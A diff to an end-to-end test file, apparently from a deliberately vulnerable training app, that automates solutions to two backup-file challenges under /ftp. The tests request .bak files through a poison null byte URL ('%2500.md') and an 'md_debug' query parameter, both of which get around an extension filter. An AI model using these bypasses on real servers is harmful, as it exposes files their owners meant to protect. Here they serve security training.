@@ -29,15 +29,21 @@ describe('/ftp', function () {
 
     describe('challenge "forgottenBackup"', function () {
 
+        it('should be able to access file /ftp/coupons_2013.md.bak abusing md_debug parameter', function () {
+            browser.driver.get(browser.baseUrl + '/ftp/coupons_2013.md.bak?md_debug=.md');
+        });
+
+        protractor.expect.challengeSolved({challenge: 'forgottenBackup'});
+
+    });
+
+    describe('challenge "forgottenDevBackup"', function () {
+
         it('should be able to access file /ftp/package.json.bak with poison null byte attack', function () {
             browser.driver.get(browser.baseUrl + '/ftp/package.json.bak%2500.md');
         });
 
-        it('should be able to access file /ftp/coupons_2013.md.bak with poison null byte attack', function () {
-            browser.driver.get(browser.baseUrl + '/ftp/coupons_2013.md.bak%2500.pdf');
-        });
-
-        protractor.expect.challengeSolved({challenge: 'forgottenBackup'});
+        protractor.expect.challengeSolved({challenge: 'forgottenDevBackup'});
 
     });
 
